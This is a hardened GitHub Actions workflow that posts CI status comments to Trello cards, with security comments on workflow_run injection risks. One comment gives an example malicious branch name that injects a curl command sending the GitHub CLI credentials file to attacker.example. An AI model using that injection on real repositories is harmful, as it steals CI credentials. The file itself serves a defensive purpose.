name: WW CI Status to Trello

# Posts a CI pass/fail comment to the Trello card a ww/* branch came from.
#
# SECURITY: this workflow is triggered by `workflow_run`, which runs from the
# default branch WITH repository secrets available -- including for runs that
# originated from a fork. Every value taken from the triggering run
# (`head_branch`, `conclusion`, `html_url`) is therefore untrusted input and
# must reach the shell through `env:`, never through `${{ }}` interpolated
# into a `run:` body. GitHub expands `${{ }}` textually before the shell
# parses the script, so an interpolated branch name such as
#   ww/x/$(curl -sd @$HOME/.config/gh/hosts.yml https://attacker.example)-y
# would execute as a command substitution. Branch names may legally contain
# `$`, backticks, `;`, `&`, `|`, `(`, `)` and quotes, so the `ww/**` filter
# below is not a mitigation -- an attacker simply prefixes their branch.

on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
    branches: ["ww/**"]

# The job only calls the Trello REST API; it needs no GitHub API access at
# all. `workflow_run` would otherwise hand it a write-capable GITHUB_TOKEN.
permissions: {}

jobs:
  notify-trello:
    if: ${{ github.event.workflow_run.conclusion != 'cancelled' }}
    runs-on: ubuntu-latest
    steps:
      - name: Extract card ID from branch name
        id: extract
        env:
          # Untrusted: passed as data, so the shell never parses its content.
          BRANCH: ${{ github.event.workflow_run.head_branch }}
        run: |
          set -euo pipefail
          # Branch format: ww/<repo>/<card-id>-<slug>
          card_id=$(printf '%s' "$BRANCH" | sed -n 's|^ww/[^/]*/\([^-]*\)-.*|\1|p')
          # ww-loop generates an 8-char prefix of the 24-char hex Trello card
          # id; full ids and 8-char shortLinks are also accepted. Restricting
          # to alphanumerics keeps the value safe to splice into the request
          # URL below (no traversal, no query or fragment injection).
          if ! printf '%s' "$card_id" | grep -Eq '^[a-zA-Z0-9]{8,24}$'; then
            echo "No valid Trello card ID in branch name - skipping notification"
            card_id=""
          fi
          echo "card_id=$card_id" >> "$GITHUB_OUTPUT"

      - name: Post CI status to Trello
        if: ${{ steps.extract.outputs.card_id != '' }}
        env:
          TRELLO_KEY: ${{ secrets.TRELLO_KEY }}
          TRELLO_TOKEN: ${{ secrets.TRELLO_TOKEN }}
          STATUS: ${{ github.event.workflow_run.conclusion }}
          DETAILS_URL: ${{ github.event.workflow_run.html_url }}
          CARD_ID: ${{ steps.extract.outputs.card_id }}
        run: |
          set -euo pipefail
          if [ "$STATUS" = "success" ]; then
            body="CI-passed: $DETAILS_URL"
          else
            body="CI-failed ($STATUS): $DETAILS_URL"
          fi
          # --data-urlencode so a value containing `&` or `=` cannot forge
          # additional form parameters, and so secrets stay out of argv.
          curl -fsS -X POST \
            "https://api.trello.com/1/cards/${CARD_ID}/actions/comments" \
            --data-urlencode "key=${TRELLO_KEY}" \
            --data-urlencode "token=${TRELLO_TOKEN}" \
            --data-urlencode "text=${body}" \
            --output /dev/null
